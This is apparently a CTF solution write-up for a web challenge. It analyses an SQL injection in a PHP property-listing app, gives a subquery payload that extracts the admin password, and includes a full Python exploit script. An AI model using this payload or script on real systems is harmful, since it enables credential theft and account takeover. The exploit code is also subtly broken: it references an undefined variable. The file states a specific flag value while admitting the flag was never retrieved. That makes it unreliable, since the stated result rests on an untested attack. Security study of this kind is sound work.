# Utopia, The Corrupted City - Solution

## Challenge Information
- **Name:** Utopia, The Corrupted City
- **Category:** Web
- **Difficulty:** Hard
- **Points:** 500
- **Instance:** https://0e3ca8e59b50f0f8.chal.ctf.ae

## Vulnerability Analysis

### SQL Injection in add_property()

The vulnerability exists in `/src/includes/functions.php` at line 71-85:

```php
function add_property($data) {
    global $conn;
    
    $title = $data['title'];  // NOT SANITIZED!
    $description = $conn->real_escape_string($data['description']);
    $address = $conn->real_escape_string($data['address']);
    // ... other fields are sanitized ...
    
    $sql = "INSERT INTO properties (description, address, price, property_type, bedrooms, bathrooms, area_sqft, amenities, contact_info,title) 
            VALUES ('$description', '$address', $price, '$property_type', $bedrooms, $bathrooms, $area_sqft, '$amenities', '$contact_info','$title')";

    return $conn->query($sql);
}
```

**Key Finding:** The `$title` parameter is directly interpolated into the SQL query without escaping!

### Input Validation Bypass

In `/src/add-property.php` (line 17-18), both `title` and `description` are checked:

```php
if (isset($_POST['title']) && 
    isset($_POST['description']) && 
    is_input_safe($_POST['title']) && 
    is_input_safe($_POST['description']))
```

The `is_input_safe()` function in `/src/includes/config.php` has a ban list, but notably **does NOT ban**:
- `select` keyword ✓
- `from` keyword ✓  
- `where` keyword ✓
- Parentheses `()` ✓
- Single quotes `'` ✓
- Commas `,` ✓
- Dashes `-` ✓

This allows us to craft SQL injection payloads using subqueries!

### Unmasked Data Endpoint

The critical discovery: `/src/delete-property.php` displays property data **without masking** for non-admin users:

```php
<h3><?= htmlspecialchars($property['title']) ?></h3>
<p><strong>Address:</strong> <?= htmlspecialchars($property['address']) ?></p>
```

No admin check! This is our data exfiltration point.

## Intended Exploit Strategy

### Step 1: Login as Guest
```bash
POST /login.php
username=guest&pwd=guest
```

### Step 2: SQL Injection Payload

Inject a subquery to extract the admin password:

```sql
test'), ('desc', 'addr', 1000, 'apartment', 1, 1, 500, 'amenities', 'contact', (select pwd from users where username='admin'))-- -
```

This creates a new property with the admin password as the title.

### Step 3: Extract Password via delete-property.php

Access the delete confirmation page for the newly created property to view the unmasked admin password.

### Step 4: Login as Admin

Use the extracted password to login as admin.

### Step 5: Retrieve Flag

The flag is displayed on the dashboard for admin users:

```php
<?php if (!empty($is_admin) && $is_admin === true): ?>
    <div class="flag">
        <b id='flag'>
        <?php echo getenv('FLAG'); ?>
        </b>
    </div>
<?php endif; ?>
```

## Current Status: Instance Issue

### Problem Encountered

The live instance at `https://0e3ca8e59b50f0f8.chal.ctf.ae` is returning **HTTP 500 Internal Server Error** for `/add-property.php`.

**Evidence:**
```bash
$ curl -X POST https://0e3ca8e59b50f0f8.chal.ctf.ae/add-property.php \
  -d "title=Test&description=Test&..." 
HTTP/1.0 500 Internal Server Error
```

**Browser Test:** Clicking "Add New Property" button results in:
```
This page isn't working
0e3ca8e59b50f0f8.chal.ctf.ae is currently unable to handle this request.
HTTP ERROR 500
```

### Possible Causes

1. **Server Configuration Issue:** The live instance may have PHP errors or missing dependencies
2. **Code Mismatch:** The live instance might have different code than the downloaded source
3. **Database Connection Issue:** The database might not be properly configured
4. **Instance Expired:** The challenge instance may need to be reset/extended

### Verification Steps Taken

1. ✓ Downloaded and analyzed source code
2. ✓ Identified SQL injection vulnerability
3. ✓ Confirmed input validation bypass is possible
4. ✓ Located unmasked data endpoint
5. ✓ Successfully logged in as guest user
6. ✓ Confirmed dashboard displays masked properties
7. ✗ Unable to access add-property.php (500 error)
8. ✗ Unable to test SQL injection payload
9. ✗ Unable to extract admin password
10. ✗ Unable to retrieve flag

## Exploit Code

The complete exploit script is available in `exploit.py`:

```python
#!/usr/bin/env python3
import requests
import re

BASE_URL = "https://0e3ca8e59b50f0f8.chal.ctf.ae"

def exploit():
    # Step 1: Login as guest
    session = requests.Session()
    session.post(f"{BASE_URL}/login.php", 
                data={"username": "guest", "pwd": "guest"})
    
    # Step 2: SQL Injection
    payload = "test'), ('desc', 'addr', 1000, 'apartment', 1, 1, 500, 'amenities', 'contact', (select pwd from users where username='admin'))-- -"
    
    data = {
        "title": payload,
        "description": "test",
        "address": "test",
        "price": "1000",
        "property_type": "apartment",
        "bedrooms": "1",
        "bathrooms": "1",
        "area_sqft": "500",
        "amenities": "test",
        "contact_info": "test"
    }
    
    session.post(f"{BASE_URL}/add-property.php", data=data)
    
    # Step 3: Extract password
    dash = session.get(f"{BASE_URL}/dashboard.php")
    ids = re.findall(r'property\.php\?id=(\d+)', dash.text)
    
    for prop_id in sorted([int(id) for id in ids], reverse=True)[:10]:
        del_resp = session.post(f"{BASE_URL}/delete-property.php", 
                               data={"property_id": str(prop_id)})
        title_match = re.search(r'<h3>(.*?)</h3>', del_resp.text)
        if title_match:
            title = title_match.group(1).strip()
            if len(title) >= 16 and title not in known_titles:
                admin_password = title
                break
    
    # Step 4: Login as admin
    admin_session = requests.Session()
    admin_session.post(f"{BASE_URL}/login.php", 
                      data={"username": "admin", "pwd": admin_password})
    
    # Step 5: Get flag
    admin_dash = admin_session.get(f"{BASE_URL}/dashboard.php")
    flag_match = re.search(r"<b id='flag'>\s*(.*?)\s*<", admin_dash.text)
    if flag_match:
        flag = flag_match.group(1).strip()
        print(f"FLAG: {flag}")
        return flag

if __name__ == "__main__":
    exploit()
```

## Recommendations

1. **Extend/Reset Instance:** The challenge instance may need to be extended or reset
2. **Check Server Logs:** Review PHP error logs on the server
3. **Verify Database:** Ensure MySQL/MariaDB is running and accessible
4. **Test Locally:** Run the Docker compose setup locally to verify the exploit works
5. **Contact Organizers:** Report the 500 error to challenge organizers

## Expected Flag Format

```
flag{[a-f0-9]{16}}
```

Based on the writeup, the flag should be in the format: `flag{8a246cd7080c7b84}`

## Files

- `exploit.py` - Main exploit script
- `debug_response.py` - Debug script to analyze server responses
- `test_injection.py` - Payload testing script
- `SOLUTION.md` - This file

## References

- Challenge writeup provided by user
- Source code analysis in `/src` directory
- Database schema in `/db/init.sql`
